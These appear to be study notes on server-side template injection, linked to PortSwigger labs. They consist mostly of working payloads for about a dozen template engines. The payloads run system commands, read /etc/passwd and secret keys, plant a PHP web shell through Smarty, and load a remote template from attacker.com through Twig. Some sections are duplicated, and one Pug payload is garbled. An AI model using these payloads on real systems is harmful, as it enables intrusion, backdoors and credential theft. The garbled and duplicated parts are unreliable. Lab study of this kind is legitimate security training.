# Server-side template injection

Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side
SSTI vulnerabilities arise when user input is concatenated into templates rather than being passed in as data
Mainly happens when **user input is embedded directly into a server-side template**, attackers can inject code to **read data**, **execute system commands**, or **achieve RCE** — depending on the template engine.

---
##  **Identification**
### Polyglot
`${{<%[%'"}}%\.`

---
###  Fuzz input with:

```plaintext
{{7*7}}
<%= 7*7 %>
${7*7}
#{7*7}

{{7*7}}<%= 7*7 %>${7*7}#{7*7}
```

## Exploitation

###  Jinja2 (Python Flask/Django)
####  Code execution payload:

```jinja
{{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True).communicate()[0]}}
```

 `407` is often the index of `<subprocess.Popen>` – use fuzzing if it's not.

####  Leak Environment:

```jinja
{{config.items()}}               # Flask
{{request.application.__globals__}}   # Flask internals
```

---

###  Twig (PHP)

```twig
{{7*7}}
{{7*'7'}}
```
### Enumeration:

```twig
{{ dump(app) }}
{{ app.request.server.all|join(',') }}
```

### LFI / Exfil:
```twig
"{{ '/etc/passwd' | file_excerpt(1,30) }}"
```

### Exploit via Template Cache Poisoning:
```twig
{{ _self.env.setCache("ftp://attacker.com:2121") }}
{{ _self.env.loadTemplate("backdoor") }}
```
### RCE:
```twig
{{['id']|filter('system')}}
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
```

---

###  Velocity (Java)

```velocity
#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($ex=$rt.getRuntime().exec("id"))$ex.waitFor()
```

---
### Freemaker (Java)

```freemarker
${7*7}   → 49
```
### RCE:
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign x="freemarker.template.utility.Execute"?new()>${x("cat /etc/passwd")}
```

---
### Java EL (Expression Language)

```jsp
${7*7}
${{7*7}}
```
### Enumeration:
```jsp
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../etc/passwd").getContent()}
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec('id')}
```

### Advanced:
```jsp
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

---

##  **Twig (PHP)**

```twig
{{7*7}}
{{7*'7'}}
```
### Enumeration:

```twig
{{ dump(app) }}
{{ app.request.server.all|join(',') }}
```
### LFI / Exfil:

```twig
"{{ '/etc/passwd' | file_excerpt(1,30) }}"
```

### Exploit via Template Cache Poisoning:

```twig
{{ _self.env.setCache("ftp://attacker.com:2121") }}
{{ _self.env.loadTemplate("backdoor") }}
```

---

##  **Smarty (PHP)**

### Detection:

```smarty
{$smarty.version}
```
### Code Execution:

```smarty
{php} echo `id`; {/php}
```
### Remote Write Shell:

```smarty
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME, "<?php passthru($_GET['cmd']); ?>", self::clearConfig())}
```

---
##  **Handlebars (NodeJS)**

Handlebars blocks logic heavily; use prototype pollution or helpers.
### Prototype Pollution-based RCE (complex chain):

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

_Use `tplmap` to automate Handlebars and Node-based SSTI chains._

---

##  **Velocity (Java)**

### Detection:

```velocity
#set($a = 1+2) → $a
```
### RCE:

```velocity
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach ($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

---

##  **ERB (Ruby)**

### RCE:

```erb
<%= system("whoami") %>
<%= `id` %>
<%= Dir.entries("/") %>
<%= File.read("/etc/passwd") %>
```

---

##  **Django (Python)**

### Detection:

```django
{% debug %}
```
### Secrets:

```django
{{ settings.SECRET_KEY }}
```

---

##  **Tornado (Python)**

### Detection:

```tornado
{{ 7*7 }}  → 49
```

### RCE:

```tornado
{% import os %}
{{ os.system("id") }}
```

_Note: `import` might be restricted — try prototype/attribute tricks._

---

##  **Mojolicious (Perl)**

### RCE:

```perl
<%= system("id") %>
<%= `cat /etc/passwd` %>
```

---

##  **Flask / Jinja2 (Python)**

```jinja
{{ 7*7 }} → 49
```
### Class Enumeration:

```jinja
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ [].__class__.__base__.__subclasses__() }}
```
### RCE (via `os.system`):

```jinja
{{ config.items() }}
{{ ''.__class__.__mro__[1].__subclasses__()[<index>](“id”,shell=True,stdout=-1).communicate() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

---

##  **Pug / Jade (NodeJS)**

### RCE:

```pug
#{root.process.mainModule.require('child_process').execSync('id').toString()}
```
```pug
.............._mr............[2].____subclasses_()[40]('/etc/passwd').read()
```

---

##  **Razor (.NET)**

### Detection:

```razor
@(1+2)
```
### RCE:

```razor
@{ var proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = "/c whoami"; proc.Start(); }
```

---
## Where to try

- Always try SSTI in:
    - Search boxes
    - Feedback forms
    - Email templates
    - URLs like `/?template=...`
- Use `tplmap` + manual payloads to escalate to RCE.
---


## Portswigger labs

[[Basic SSTI for ERB]]
[[Basic code context on Tornado python]]
[[Using documentation for Freemaker - Java]]
[[Unknown language with a documented exploit for Node - JS]]
[[Information disclosure via user-supplied objects for Django - python]]



